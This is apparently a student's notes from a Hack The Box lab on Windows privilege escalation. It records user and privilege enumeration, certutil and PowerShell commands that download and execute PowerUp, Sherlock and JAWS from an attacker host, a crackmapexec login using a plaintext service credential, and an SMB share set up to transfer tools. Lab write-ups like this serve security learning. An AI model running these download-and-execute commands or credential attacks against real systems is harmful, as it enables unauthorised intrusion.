
We got the low level user let's escalate and do the required enumeration 
```
88ee0f1c046c9f0ca4cbe7c6003c9388
```
![[Pasted image 20231114162434.png]]

```
hostname
#User Enumeration
whoami
whoami /priv
whoami /groups
```
![[Pasted image 20231114162706.png]]

```
net user
```
![[Pasted image 20231114162920.png]]

Let's try some automated tools and see if we can got something out of it
```
certutil.exe -urlcache -f http://10.10.16.2:8000/winPEASany.exe winpeas.exe
```

Powerup
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/PowerUp.ps1') | powershell -noprofile -
```
![[Pasted image 20231114163812.png]]

Sherlock
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/Sherlock.ps1') | powershell -noprofile -
```
![[Pasted image 20231114164120.png]]

Jaws
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/jaws-enum.ps1') | powershell -noprofile -
```


![[Pasted image 20231114164839.png]]

```
crackmapexec smb 10.10.10.161 -u svc-alfresco -p 's3rvice' 
```
![[Pasted image 20231114232726.png]]


I like to dig deeper her 
```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

Setting up a SMB-share to run Winpeas
Iwas not able to run Winpeas earlier but after seeing the video they have taught a way to do that. We have to make a smb share with user and password so let's give it a try for myself and see what happens.

```
impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
```

Get a NEW PSDrive 
So to do that we have to put the user and password in Credential Object.
```
$pass = convertto-securestring 'testing' -AsPlainText -Force 
```

```
$cred= New-Object System.Management.Automation.PSCredential('testing', $pass)
```

```
New-PSDrive -Name testing -PSProvider FileSystem -Credential $cred -Root \\10.10.16.8\Hackthebox
```

![[Pasted image 20231115113526.png]]
As you can see we were able to connect successfully

![[Pasted image 20231115113606.png]]

```
cd testing:
```
![[Pasted image 20231115113902.png]]
Still i was not able to run winpeas no worries as i have already enumerated and found that the exploit will not be releated to GPP xml in which we could simply find the cpassword and escalate the exploit might with GPP policy so will run Blood hound instead.




